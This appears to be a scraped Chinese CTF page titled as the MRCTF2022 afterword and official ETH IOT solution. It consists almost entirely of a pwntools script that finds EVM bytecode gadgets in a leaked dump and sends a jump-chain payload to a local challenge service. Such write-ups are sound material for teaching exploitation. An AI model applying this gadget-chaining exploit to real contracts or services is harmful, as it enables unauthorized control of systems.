# MRCTF2022 后记 & ETH IOT 官方题解 By Retr_0

> 原文: https://www.ctfiot.com/37681.html
> ID: 37681


```
JUMPDEST
MSTORE
JUMP
JUMPDEST
RETURN
STOP
from pwn import *
from pyevmasm import assemble_hex,disassemble_hex
import re
data1="""
JUMPDEST
MSTORE
JUMP
"""
data2="""
JUMPDEST
RETURN
STOP
"""
p=remote("localhost",1337)
p.recvuntil(b"Input > ")
p.sendline(b'2')
temp=p.recvuntil(b"\n")[8:-1]
temps=temp.decode('utf-8')
MSTORE_GADGET=assemble_hex(data1)[2:]
RETURN_GADGET=assemble_hex(data2)[2:]
ms_addr=temps.find(MSTORE_GADGET)
RT_addr=temps.find(RETURN_GADGET)
print(MSTORE_GADGET)
print(RETURN_GADGET)
print(temps)
print(ms_addr,RT_addr)
print(temps[ms_addr:
ms_addr+6],temps[RT_addr:
RT_addr+6])
RTADDRESS=RT_addr/2
MS_ADDRESS=ms_addr/2
"""
PUSH2 0x01
PUSH2 0x80
MSTORE
PUSH2 0x20
PUSH2 0x80
RET STOP

PUSH2 0x20
PUSH2 0x80
PUSH2 JUMPGADGET_RET
PUSH2 0x01
PUSH2 0x80
PUSH2 RET gadget
"""
payload="0x0014,0x0065,"+"0x"+hex(int(RTADDRESS))[2:].rjust(4,'0')+",0x00ed,0x006d,"+"0x"+hex(int(MS_ADDRESS))[2:].rjust(4,'0')
print(payload)
p.recvuntil(b"INPUT YOUR JUMP:")
p.sendline(payload.encode('utf-8'))
p.interactive()
```
